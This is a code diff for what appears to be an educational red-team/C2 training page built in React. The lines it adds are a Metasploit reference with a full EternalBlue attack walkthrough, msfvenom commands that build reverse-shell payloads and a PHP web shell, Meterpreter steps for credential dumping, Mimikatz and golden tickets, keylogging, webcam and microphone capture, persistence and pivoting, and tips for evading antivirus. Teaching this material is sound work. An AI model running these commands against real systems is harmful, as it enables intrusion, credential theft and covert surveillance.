+                        <Grid item xs={12} md={4}>
+                          <Paper sx={{ p: 2 }}>
+                            <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#ef4444" }}>
+                              Credential Harvesting
+                            </Typography>
+                            <Box component="pre" sx={{ 
+                              bgcolor: "#1e1e1e", 
+                              color: "#d4d4d4", 
+                              p: 1.5, 
+                              borderRadius: 1, 
+                              fontSize: "0.7rem",
+                              overflow: "auto"
+                            }}>
+{`meterpreter > hashdump
+meterpreter > load kiwi
+meterpreter > creds_all
+meterpreter > lsa_dump_sam
+meterpreter > lsa_dump_secrets
+meterpreter > wifi_list`}
+                            </Box>
+                          </Paper>
+                        </Grid>
+                        <Grid item xs={12} md={4}>
+                          <Paper sx={{ p: 2 }}>
+                            <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#22c55e" }}>
+                              Process & Session
+                            </Typography>
+                            <Box component="pre" sx={{ 
+                              bgcolor: "#1e1e1e", 
+                              color: "#d4d4d4", 
+                              p: 1.5, 
+                              borderRadius: 1, 
+                              fontSize: "0.7rem",
+                              overflow: "auto"
+                            }}>
+{`meterpreter > migrate 1234
+meterpreter > execute -f cmd.exe -i -H
+meterpreter > shell
+meterpreter > background
+meterpreter > sessions -l
+meterpreter > sessions -i 1`}
+                            </Box>
+                          </Paper>
+                        </Grid>
+                        <Grid item xs={12} md={4}>
+                          <Paper sx={{ p: 2 }}>
+                            <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#0ea5e9" }}>
+                              Surveillance
+                            </Typography>
+                            <Box component="pre" sx={{ 
+                              bgcolor: "#1e1e1e", 
+                              color: "#d4d4d4", 
+                              p: 1.5, 
+                              borderRadius: 1, 
+                              fontSize: "0.7rem",
+                              overflow: "auto"
+                            }}>
+{`meterpreter > screenshot
+meterpreter > keyscan_start
+meterpreter > keyscan_dump
+meterpreter > webcam_snap
+meterpreter > record_mic
+meterpreter > screenshare`}
+                            </Box>
+                          </Paper>
+                        </Grid>
+                      </Grid>
+
+                      {/* Common Workflow */}
+                      <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
+                        <TimelineIcon sx={{ color: accent }} />
+                        Typical Metasploit Workflow
+                      </Typography>
+                      <Stepper orientation="vertical" sx={{ mb: 3 }}>
+                        <Step active>
+                          <StepLabel><Typography variant="subtitle2" sx={{ fontWeight: 700 }}>1. Reconnaissance & Scanning</Typography></StepLabel>
+                          <StepContent>
+                            <Box component="pre" sx={{ bgcolor: "#1e1e1e", color: "#d4d4d4", p: 1.5, borderRadius: 1, fontSize: "0.75rem" }}>
+{`msf6 > db_nmap -sV -sC -p- 192.168.1.0/24
+msf6 > hosts
+msf6 > services -p 445
+msf6 > vulns`}
+                            </Box>
+                          </StepContent>
+                        </Step>
+                        <Step active>
+                          <StepLabel><Typography variant="subtitle2" sx={{ fontWeight: 700 }}>2. Select & Configure Exploit</Typography></StepLabel>
+                          <StepContent>
+                            <Box component="pre" sx={{ bgcolor: "#1e1e1e", color: "#d4d4d4", p: 1.5, borderRadius: 1, fontSize: "0.75rem" }}>
+{`msf6 > search type:exploit platform:windows smb
+msf6 > use exploit/windows/smb/ms17_010_eternalblue
+msf6 exploit(ms17_010_eternalblue) > show options
+msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.100
+msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.50`}
+                            </Box>
+                          </StepContent>
+                        </Step>
+                        <Step active>
+                          <StepLabel><Typography variant="subtitle2" sx={{ fontWeight: 700 }}>3. Select Payload</Typography></StepLabel>
+                          <StepContent>
+                            <Box component="pre" sx={{ bgcolor: "#1e1e1e", color: "#d4d4d4", p: 1.5, borderRadius: 1, fontSize: "0.75rem" }}>
+{`msf6 exploit(ms17_010_eternalblue) > show payloads
+msf6 exploit(ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
+msf6 exploit(ms17_010_eternalblue) > show options`}
+                            </Box>
+                          </StepContent>
+                        </Step>
+                        <Step active>
+                          <StepLabel><Typography variant="subtitle2" sx={{ fontWeight: 700 }}>4. Execute & Get Shell</Typography></StepLabel>
+                          <StepContent>
+                            <Box component="pre" sx={{ bgcolor: "#1e1e1e", color: "#d4d4d4", p: 1.5, borderRadius: 1, fontSize: "0.75rem" }}>
+{`msf6 exploit(ms17_010_eternalblue) > exploit
+[*] Started reverse TCP handler on 192.168.1.50:4444
+[*] Sending exploit...
+[*] Meterpreter session 1 opened
+meterpreter > sysinfo`}
+                            </Box>
+                          </StepContent>
+                        </Step>
+                        <Step active>
+                          <StepLabel><Typography variant="subtitle2" sx={{ fontWeight: 700 }}>5. Post-Exploitation</Typography></StepLabel>
+                          <StepContent>
+                            <Box component="pre" sx={{ bgcolor: "#1e1e1e", color: "#d4d4d4", p: 1.5, borderRadius: 1, fontSize: "0.75rem" }}>
+{`meterpreter > getsystem
+meterpreter > hashdump
+meterpreter > run post/windows/gather/enum_logged_on_users
+meterpreter > run post/multi/manage/autoroute
+meterpreter > run post/windows/manage/persistence_exe`}
+                            </Box>
+                          </StepContent>
+                        </Step>
+                      </Stepper>
+
+                      {/* msfvenom Payload Generation */}
+                      <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
+                        <BuildIcon sx={{ color: accent }} />
+                        msfvenom Payload Generation
+                      </Typography>
+                      <Alert severity="info" sx={{ mb: 2 }}>
+                        <Typography variant="body2">
+                          msfvenom combines payload generation and encoding. Use <code>-p</code> for payload, <code>-f</code> for format, <code>-e</code> for encoder, <code>-i</code> for iterations.
+                        </Typography>
+                      </Alert>
+                      <Grid container spacing={2} sx={{ mb: 3 }}>
+                        <Grid item xs={12} md={6}>
+                          <Paper sx={{ p: 2 }}>
+                            <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Windows Payloads</Typography>
+                            <Box component="pre" sx={{ bgcolor: "#1e1e1e", color: "#d4d4d4", p: 1.5, borderRadius: 1, fontSize: "0.65rem", overflow: "auto" }}>
+{`# Staged Meterpreter (smaller, needs handler)
+msfvenom -p windows/x64/meterpreter/reverse_tcp \\
+  LHOST=192.168.1.50 LPORT=443 -f exe > shell.exe
+
+# Stageless Meterpreter (larger, self-contained)
+msfvenom -p windows/x64/meterpreter_reverse_https \\
+  LHOST=192.168.1.50 LPORT=443 -f exe > shell.exe
+
+# DLL payload for DLL hijacking
+msfvenom -p windows/x64/meterpreter/reverse_tcp \\
+  LHOST=192.168.1.50 LPORT=443 -f dll > evil.dll
+
+# PowerShell one-liner
+msfvenom -p windows/x64/meterpreter/reverse_tcp \\
+  LHOST=192.168.1.50 LPORT=443 -f psh-cmd`}
+                            </Box>
+                          </Paper>
+                        </Grid>
+                        <Grid item xs={12} md={6}>
+                          <Paper sx={{ p: 2 }}>
+                            <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Linux & Web Payloads</Typography>
+                            <Box component="pre" sx={{ bgcolor: "#1e1e1e", color: "#d4d4d4", p: 1.5, borderRadius: 1, fontSize: "0.65rem", overflow: "auto" }}>
+{`# Linux ELF binary
+msfvenom -p linux/x64/meterpreter/reverse_tcp \\
+  LHOST=192.168.1.50 LPORT=443 -f elf > shell.elf
+
+# Python payload
+msfvenom -p python/meterpreter/reverse_tcp \\
+  LHOST=192.168.1.50 LPORT=443 -f raw > shell.py
+
+# PHP web shell
+msfvenom -p php/meterpreter/reverse_tcp \\
+  LHOST=192.168.1.50 LPORT=443 -f raw > shell.php
+
+# Java JAR
+msfvenom -p java/meterpreter/reverse_tcp \\
+  LHOST=192.168.1.50 LPORT=443 -f jar > shell.jar`}
+                            </Box>
+                          </Paper>
+                        </Grid>
+                      </Grid>
+
+                      {/* Pivoting & Port Forwarding */}
+                      <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
+                        <RouterIcon sx={{ color: accent }} />
+                        Pivoting & Network Tunneling
+                      </Typography>
+                      <Grid container spacing={2} sx={{ mb: 3 }}>
+                        <Grid item xs={12} md={6}>
+                          <Paper sx={{ p: 2, bgcolor: alpha("#14b8a6", 0.05), border: `1px solid ${alpha("#14b8a6", 0.2)}` }}>
+                            <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#14b8a6", mb: 1 }}>Autoroute (Pivoting)</Typography>
+                            <Typography variant="body2" color="text.secondary" sx={{ mb: 1 }}>
+                              Route traffic through a compromised host to reach internal networks.
+                            </Typography>
+                            <Box component="pre" sx={{ bgcolor: "#1e1e1e", color: "#d4d4d4", p: 1, borderRadius: 1, fontSize: "0.7rem" }}>
+{`# Add route through session
+meterpreter > run autoroute -s 10.10.10.0/24
+
+# Or from msfconsole
+msf6 > route add 10.10.10.0/24 1
+
+# Verify routes
+msf6 > route print`}
+                            </Box>
+                          </Paper>
+                        </Grid>
+                        <Grid item xs={12} md={6}>
+                          <Paper sx={{ p: 2, bgcolor: alpha("#f472b6", 0.05), border: `1px solid ${alpha("#f472b6", 0.2)}` }}>
+                            <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#f472b6", mb: 1 }}>Port Forwarding</Typography>
+                            <Typography variant="body2" color="text.secondary" sx={{ mb: 1 }}>
+                              Forward local ports to access remote services through the session.
+                            </Typography>
+                            <Box component="pre" sx={{ bgcolor: "#1e1e1e", color: "#d4d4d4", p: 1, borderRadius: 1, fontSize: "0.7rem" }}>
+{`# Local port forward (access RDP)
+meterpreter > portfwd add -l 3389 \\
+  -p 3389 -r 10.10.10.5
+
+# Reverse port forward
+meterpreter > portfwd add -R -l 8080 \\
+  -p 80 -L 192.168.1.50
+
+# SOCKS proxy for browser
+msf6 > use auxiliary/server/socks_proxy
+msf6 > set SRVPORT 9050
+msf6 > run -j`}
+                            </Box>
+                          </Paper>
+                        </Grid>
+                      </Grid>
+
+                      {/* Key Post-Exploitation Modules */}
+                      <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
+                        <SecurityIcon sx={{ color: accent }} />
+                        Essential Post-Exploitation Modules
+                      </Typography>
+                      <TableContainer component={Paper} sx={{ mb: 3 }}>
+                        <Table size="small">
+                          <TableHead>
+                            <TableRow sx={{ bgcolor: alpha(accent, 0.1) }}>
+                              <TableCell sx={{ fontWeight: 700 }}>Module</TableCell>
+                              <TableCell sx={{ fontWeight: 700 }}>Purpose</TableCell>
+                            </TableRow>
+                          </TableHead>
+                          <TableBody>
+                            {[
+                              { module: "post/windows/gather/hashdump", purpose: "Dump SAM database hashes" },
+                              { module: "post/windows/gather/credentials/credential_collector", purpose: "Collect various credentials" },
+                              { module: "post/multi/recon/local_exploit_suggester", purpose: "Suggest privilege escalation exploits" },
+                              { module: "post/windows/gather/enum_domain", purpose: "Enumerate Active Directory domain" },
+                              { module: "post/windows/manage/migrate", purpose: "Migrate to another process" },
+                              { module: "post/windows/manage/persistence_exe", purpose: "Install persistent backdoor" },
+                              { module: "post/windows/gather/enum_logged_on_users", purpose: "List logged-on users" },
+                              { module: "post/windows/gather/enum_shares", purpose: "Enumerate network shares" },
+                              { module: "post/multi/manage/shell_to_meterpreter", purpose: "Upgrade shell to Meterpreter" },
+                              { module: "post/windows/gather/smart_hashdump", purpose: "Smart hash dump with PSExec" },
+                            ].map((row, i) => (
+                              <TableRow key={i}>
+                                <TableCell sx={{ fontFamily: "monospace", fontSize: "0.7rem", color: accent }}>{row.module}</TableCell>
+                                <TableCell sx={{ fontSize: "0.8rem" }}>{row.purpose}</TableCell>
+                              </TableRow>
+                            ))}
+                          </TableBody>
+                        </Table>
+                      </TableContainer>
+
+                      {/* Kiwi (Mimikatz) */}
+                      <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
+                        <FingerprintIcon sx={{ color: accent }} />
+                        Kiwi Extension (Mimikatz Integration)
+                      </Typography>
+                      <Alert severity="error" sx={{ mb: 2 }}>
+                        <AlertTitle>Windows Credential Extraction</AlertTitle>
+                        <Typography variant="body2">
+                          Kiwi brings Mimikatz capabilities directly into Meterpreter. Requires SYSTEM privileges. Highly detected - use sparingly.
+                        </Typography>
+                      </Alert>
+                      <Box component="pre" sx={{ bgcolor: "#1e1e1e", color: "#d4d4d4", p: 2, borderRadius: 1, fontSize: "0.75rem", mb: 3 }}>
+{`meterpreter > getsystem                    # Escalate to SYSTEM
+meterpreter > load kiwi                    # Load Mimikatz extension
+meterpreter > help kiwi                    # Show kiwi commands
+
+# Credential dumping
+meterpreter > creds_all                    # All credentials
+meterpreter > creds_msv                    # MSV credentials (NTLM hashes)
+meterpreter > creds_kerberos               # Kerberos tickets
+meterpreter > creds_wdigest                # WDigest plaintext (if enabled)
+meterpreter > creds_tspkg                  # TsPkg credentials
+
+# LSA secrets
+meterpreter > lsa_dump_sam                 # SAM database
+meterpreter > lsa_dump_secrets             # LSA secrets (service accounts)
+
+# Golden ticket
+meterpreter > golden_ticket_create -d DOMAIN.LOCAL \\
+  -u Administrator -s S-1-5-21-... -k <krbtgt_hash> -t /tmp/golden.kirbi
+
+# Kerberos ticket manipulation
+meterpreter > kerberos_ticket_list         # List tickets
+meterpreter > kerberos_ticket_purge        # Purge tickets
+meterpreter > kerberos_ticket_use /tmp/ticket.kirbi   # Load ticket`}
+                      </Box>
+
+                      {/* Database & Workspaces */}
+                      <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
+                        <StorageIcon sx={{ color: accent }} />
+                        Database & Workspaces
+                      </Typography>
+                      <Grid container spacing={2} sx={{ mb: 3 }}>
+                        <Grid item xs={12} md={6}>
+                          <Paper sx={{ p: 2 }}>
+                            <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Database Setup</Typography>
+                            <Box component="pre" sx={{ bgcolor: "#1e1e1e", color: "#d4d4d4", p: 1.5, borderRadius: 1, fontSize: "0.7rem" }}>
+{`# Initialize database
+$ sudo msfdb init
+
+# Connect in msfconsole
+msf6 > db_status
+msf6 > db_connect msf:password@127.0.0.1/msf
+
+# Import nmap results
+msf6 > db_import /path/to/scan.xml`}
+                            </Box>
+                          </Paper>
+                        </Grid>
+                        <Grid item xs={12} md={6}>
+                          <Paper sx={{ p: 2 }}>
+                            <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Workspace Management</Typography>
+                            <Box component="pre" sx={{ bgcolor: "#1e1e1e", color: "#d4d4d4", p: 1.5, borderRadius: 1, fontSize: "0.7rem" }}>
+{`# List workspaces
+msf6 > workspace
+
+# Create new workspace
+msf6 > workspace -a clientname
+
+# Switch workspace
+msf6 > workspace clientname
+
+# Delete workspace
+msf6 > workspace -d oldproject`}
+                            </Box>
+                          </Paper>
+                        </Grid>
+                      </Grid>
+
+                      {/* Resource Scripts */}
+                      <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
+                        <CodeIcon sx={{ color: accent }} />
+                        Resource Scripts & Automation
+                      </Typography>
+                      <Grid container spacing={2} sx={{ mb: 3 }}>
+                        <Grid item xs={12}>
+                          <Paper sx={{ p: 2 }}>
+                            <Typography variant="body2" color="text.secondary" sx={{ mb: 1 }}>
+                              Resource scripts (.rc files) automate repetitive tasks. Execute with <code>resource filename.rc</code>.
+                            </Typography>
+                            <Box component="pre" sx={{ bgcolor: "#1e1e1e", color: "#d4d4d4", p: 1.5, borderRadius: 1, fontSize: "0.7rem" }}>
+{`# quick_handler.rc - Set up a reverse shell handler
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_https
+set LHOST 0.0.0.0
+set LPORT 443
+set ExitOnSession false
+exploit -j
+
+# Run with: msf6 > resource quick_handler.rc
+
+# auto_post.rc - Automatic post-exploitation
+sysinfo
+getuid
+run post/multi/recon/local_exploit_suggester
+run post/windows/gather/enum_logged_on_users
+hashdump`}
+                            </Box>
+                          </Paper>
+                        </Grid>
+                      </Grid>
+
+                      {/* Evasion Tips */}
+                      <Alert severity="warning" sx={{ mb: 2, borderRadius: 2 }}>
+                        <AlertTitle>⚠️ Detection & Evasion Considerations</AlertTitle>
+                        <Grid container spacing={2}>
+                          <Grid item xs={12} md={6}>
+                            <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Why Metasploit Gets Detected</Typography>
+                            <List dense>
+                              {[
+                                "Default payloads are heavily signatured",
+                                "Network traffic patterns are well-known",
+                                "Default shellcode is in every AV database",
+                                "Process injection techniques are monitored",
+                                "Meterpreter DLL hashes are known"
+                              ].map((item, i) => (
+                                <ListItem key={i} sx={{ py: 0 }}>
+                                  <ListItemIcon sx={{ minWidth: 20 }}>
+                                    <WarningIcon sx={{ fontSize: 12, color: "warning.main" }} />
+                                  </ListItemIcon>
+                                  <ListItemText primary={item} primaryTypographyProps={{ variant: "body2", fontSize: "0.75rem" }} />
+                                </ListItem>
+                              ))}
+                            </List>
+                          </Grid>
+                          <Grid item xs={12} md={6}>
+                            <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Basic Evasion Techniques</Typography>
+                            <List dense>
+                              {[
+                                "Use stageless payloads for smaller signatures",
+                                "Apply encoders: -e x64/zutto_dekiru -i 5",
+                                "Use custom templates: -x legitimate.exe",
+                                "Encrypt communications: reverse_https",
+                                "Consider Veil, Shellter, or custom loaders"
+                              ].map((item, i) => (
+                                <ListItem key={i} sx={{ py: 0 }}>
+                                  <ListItemIcon sx={{ minWidth: 20 }}>
+                                    <CheckCircleIcon sx={{ fontSize: 12, color: "success.main" }} />
+                                  </ListItemIcon>
+                                  <ListItemText primary={item} primaryTypographyProps={{ variant: "body2", fontSize: "0.75rem" }} />
+                                </ListItem>
+                              ))}
+                            </List>
+                          </Grid>
+                        </Grid>
+                      </Alert>
+
+                      {/* Learning Resources */}
+                      <Typography variant="h6" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
+                        <SchoolIcon sx={{ color: accent }} />
+                        Learning Path & Resources
+                      </Typography>
+                      <Grid container spacing={2}>
+                        <Grid item xs={12} md={4}>
+                          <Paper sx={{ p: 2, bgcolor: alpha("#3b82f6", 0.05) }}>
+                            <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#3b82f6", mb: 1 }}>Beginner</Typography>
+                            <List dense>
+                              {[
+                                "Metasploit Unleashed (free course)",
+                                "TryHackMe Metasploit rooms",
+                                "HackTheBox Starting Point",
+                                "Official documentation"
+                              ].map((item, i) => (
+                                <ListItem key={i} sx={{ py: 0.25 }}>
+                                  <ListItemText primary={`• ${item}`} primaryTypographyProps={{ variant: "body2", fontSize: "0.8rem" }} />
+                                </ListItem>
+                              ))}
+                            </List>
+                          </Paper>
+                        </Grid>
+                        <Grid item xs={12} md={4}>
+                          <Paper sx={{ p: 2, bgcolor: alpha("#f59e0b", 0.05) }}>
+                            <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#f59e0b", mb: 1 }}>Intermediate</Typography>
+                            <List dense>
+                              {[
+                                "Custom module development",
+                                "Advanced pivoting techniques",
+                                "Post-exploitation automation",
+                                "Payload customization"
+                              ].map((item, i) => (
+                                <ListItem key={i} sx={{ py: 0.25 }}>
+                                  <ListItemText primary={`• ${item}`} primaryTypographyProps={{ variant: "body2", fontSize: "0.8rem" }} />
+                                </ListItem>
+                              ))}
+                            </List>
+                          </Paper>
+                        </Grid>
+                        <Grid item xs={12} md={4}>
+                          <Paper sx={{ p: 2, bgcolor: alpha("#ef4444", 0.05) }}>
+                            <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#ef4444", mb: 1 }}>Advanced</Typography>
+                            <List dense>
+                              {[
+                                "Writing custom exploits",
+                                "ROP chain development",
+                                "Evasion research",
+                                "Contribute to Metasploit"
+                              ].map((item, i) => (
+                                <ListItem key={i} sx={{ py: 0.25 }}>
+                                  <ListItemText primary={`• ${item}`} primaryTypographyProps={{ variant: "body2", fontSize: "0.8rem" }} />
+                                </ListItem>
+                              ))}
+                            </List>
+                          </Paper>
+                        </Grid>
+                      </Grid>
+                    </Grid>
+                  )}
                 </Grid>
               </AccordionDetails>
             </Accordion>
-          ))}
+          );
+          })}
 
           <Paper sx={{ p: 3, borderRadius: 2 }}>
             <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
@@ -2756,17 +5532,19 @@ shell       # Interactive shell`}</CodeBlock>
             </Stepper>
           </Paper>
         </Box>
-      )}
 
-      {/* Tab 2: Protocols */}
-      {activeTab === 2 && (
-        <Box sx={{ display: "flex", flexDirection: "column", gap: 3 }}>
-          <Alert severity="info" sx={{ borderRadius: 2 }}>
-            <AlertTitle>C2 Communication Protocols</AlertTitle>
-            Different protocols offer trade-offs between stealth, speed, and reliability.
-            Choose based on target environment and detection capabilities. Most operations use HTTPS
-            for initial callback, with DNS as a fallback channel.
-          </Alert>
+      {/* Section: Protocols */}
+      <Box id="protocols" sx={{ display: "flex", flexDirection: "column", gap: 3, mt: 4, scrollMarginTop: 80 }}>
+        <Typography variant="h4" sx={{ fontWeight: 800, mb: 1, display: "flex", alignItems: "center", gap: 2 }}>
+          <NetworkCheckIcon sx={{ color: accent }} />
+          Protocols
+        </Typography>
+        <Alert severity="info" sx={{ borderRadius: 2 }}>
+          <AlertTitle>C2 Communication Protocols</AlertTitle>
+          Different protocols offer trade-offs between stealth, speed, and reliability.
+          Choose based on target environment and detection capabilities. Most operations use HTTPS
+          for initial callback, with DNS as a fallback channel.
+        </Alert>
 
           {/* Protocol Quick Reference */}
           <Paper sx={{ p: 3, borderRadius: 2 }}>
@@ -2883,16 +5661,18 @@ shell       # Interactive shell`}</CodeBlock>
             </Grid>
           </Paper>
         </Box>
-      )}
 
-      {/* Tab 3: Infrastructure */}
-      {activeTab === 3 && (
-        <Box sx={{ display: "flex", flexDirection: "column", gap: 3 }}>
-          <Alert severity="info" sx={{ borderRadius: 2 }}>
-            <AlertTitle>C2 Infrastructure Design</AlertTitle>
-            Proper infrastructure setup is critical for operational security and mission success. A well-designed 
-            C2 infrastructure protects your team server, provides redundancy, and helps blend into normal traffic.
-          </Alert>
+      {/* Section: Infrastructure */}
+      <Box id="infrastructure" sx={{ display: "flex", flexDirection: "column", gap: 3, mt: 4, scrollMarginTop: 80 }}>
+        <Typography variant="h4" sx={{ fontWeight: 800, mb: 1, display: "flex", alignItems: "center", gap: 2 }}>
+          <CloudIcon sx={{ color: accent }} />
+          Infrastructure
+        </Typography>
+        <Alert severity="info" sx={{ borderRadius: 2 }}>
+          <AlertTitle>C2 Infrastructure Design</AlertTitle>
+          Proper infrastructure setup is critical for operational security and mission success. A well-designed 
+          C2 infrastructure protects your team server, provides redundancy, and helps blend into normal traffic.
+        </Alert>
 
           {/* Infrastructure Overview */}
           <Paper sx={{ p: 3, borderRadius: 2 }}>
@@ -3117,16 +5897,18 @@ async function handleRequest(request) {
             </Accordion>
           </Paper>
         </Box>
-      )}
 
-      {/* Tab 4: OPSEC */}
-      {activeTab === 4 && (
-        <Box sx={{ display: "flex", flexDirection: "column", gap: 3 }}>
-          <Alert severity="warning" sx={{ borderRadius: 2 }}>
-            <AlertTitle>Operational Security is Critical</AlertTitle>
-            Poor OPSEC can burn operations, compromise infrastructure, alert defenders, and in worst cases,
-            end careers. Every decision has OPSEC implications - always think like the defender.
-          </Alert>
+      {/* Section: OPSEC */}
+      <Box id="opsec" sx={{ display: "flex", flexDirection: "column", gap: 3, mt: 4, scrollMarginTop: 80 }}>
+        <Typography variant="h4" sx={{ fontWeight: 800, mb: 1, display: "flex", alignItems: "center", gap: 2 }}>
+          <VisibilityOffIcon sx={{ color: accent }} />
+          OPSEC
+        </Typography>
+        <Alert severity="warning" sx={{ borderRadius: 2 }}>
+          <AlertTitle>Operational Security is Critical</AlertTitle>
+          Poor OPSEC can burn operations, compromise infrastructure, alert defenders, and in worst cases,
+          end careers. Every decision has OPSEC implications - always think like the defender.
+        </Alert>
 
           {/* OPSEC Checklist */}
           <Paper sx={{ p: 3, borderRadius: 2, bgcolor: alpha("#f59e0b", 0.02) }}>
@@ -3286,16 +6068,18 @@ http-get {
 # - Response should parse as valid JSON if inspected`}</CodeBlock>
           </Paper>
         </Box>
-      )}
 
-      {/* Tab 5: Detection */}
-      {activeTab === 5 && (
-        <Box sx={{ display: "flex", flexDirection: "column", gap: 3 }}>
-          <Alert severity="info" sx={{ borderRadius: 2 }}>
-            <AlertTitle>Knowing Detection Helps Evasion</AlertTitle>
-            Understanding how C2 is detected helps red teams improve their tradecraft. This section covers both
-            perspectives - how defenders detect C2, and how to avoid those detections.
-          </Alert>
+      {/* Section: Detection */}
+      <Box id="detection" sx={{ display: "flex", flexDirection: "column", gap: 3, mt: 4, scrollMarginTop: 80 }}>
+        <Typography variant="h4" sx={{ fontWeight: 800, mb: 1, display: "flex", alignItems: "center", gap: 2 }}>
+          <ShieldIcon sx={{ color: accent }} />
+          Detection
+        </Typography>
+        <Alert severity="info" sx={{ borderRadius: 2 }}>
+          <AlertTitle>Knowing Detection Helps Evasion</AlertTitle>
+          Understanding how C2 is detected helps red teams improve their tradecraft. This section covers both
+          perspectives - how defenders detect C2, and how to avoid those detections.
+        </Alert>
 
           {/* Detection Overview */}
           <Paper sx={{ p: 3, borderRadius: 2 }}>
@@ -3513,15 +6297,17 @@ level: high
             </Accordion>
           </Paper>
         </Box>
-      )}
 
-      {/* Tab 6: Resources */}
-      {activeTab === 6 && (
-        <Box sx={{ display: "flex", flexDirection: "column", gap: 3 }}>
-          <Paper sx={{ p: 3, borderRadius: 2 }}>
-            <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
-              Quick Reference Commands
-            </Typography>
+      {/* Section: Resources */}
+      <Box id="resources" sx={{ display: "flex", flexDirection: "column", gap: 3, mt: 4, scrollMarginTop: 80 }}>
+        <Typography variant="h4" sx={{ fontWeight: 800, mb: 1, display: "flex", alignItems: "center", gap: 2 }}>
+          <SchoolIcon sx={{ color: accent }} />
+          Resources
+        </Typography>
+        <Paper sx={{ p: 3, borderRadius: 2 }}>
+          <Typography variant="h6" sx={{ fontWeight: 700, mb: 2 }}>
+            Quick Reference Commands
+          </Typography>
             
             <Accordion>
               <AccordionSummary expandIcon={<ExpandMoreIcon />}>
@@ -3740,7 +6526,6 @@ level: high
             </Grid>
           </Paper>
         </Box>
-      )}
 
       <Paper
         id="quiz-section"
@@ -3749,6 +6534,7 @@ level: high
           p: 4,
           borderRadius: 3,
           border: `1px solid ${alpha(QUIZ_ACCENT_COLOR, 0.2)}`,
+          scrollMarginTop: 80,
         }}
       >
         <Typography variant="h5" sx={{ fontWeight: 800, mb: 3, display: "flex", alignItems: "center", gap: 2 }}>
@@ -3870,29 +6656,30 @@ level: high
             {sectionNavItems.map((item) => (
               <ListItem
                 key={item.id}
-                onClick={() => navigateToSection(item.id)}
+                onClick={() => scrollToSection(item.id)}
                 sx={{
                   borderRadius: 2,
                   mb: 0.5,
+                  pl: item.indent ? 4 : 2,
                   cursor: "pointer",
-                  bgcolor: activeTab === item.id ? alpha(accent, 0.15) : "transparent",
-                  borderLeft: activeTab === item.id ? `3px solid ${accent}` : "3px solid transparent",
+                  bgcolor: activeSection === item.id ? alpha(accent, 0.15) : "transparent",
+                  borderLeft: activeSection === item.id ? `3px solid ${accent}` : "3px solid transparent",
                   "&:hover": {
                     bgcolor: alpha(accent, 0.08),
                   },
                   transition: "all 0.15s ease",
                 }}
               >
-                <ListItemIcon sx={{ minWidth: 32, color: activeTab === item.id ? accent : "text.secondary" }}>
+                <ListItemIcon sx={{ minWidth: item.indent ? 24 : 32, color: activeSection === item.id ? accent : "text.secondary" }}>
                   {item.icon}
                 </ListItemIcon>
                 <ListItemText
                   primary={
                     <Typography
-                      variant="body2"
+                      variant={item.indent ? "caption" : "body2"}
                       sx={{
-                        fontWeight: activeTab === item.id ? 700 : 500,
-                        color: activeTab === item.id ? accent : "text.primary",
+                        fontWeight: activeSection === item.id ? 700 : 500,
+                        color: activeSection === item.id ? accent : "text.primary",
                       }}
                     >
                       {item.label}
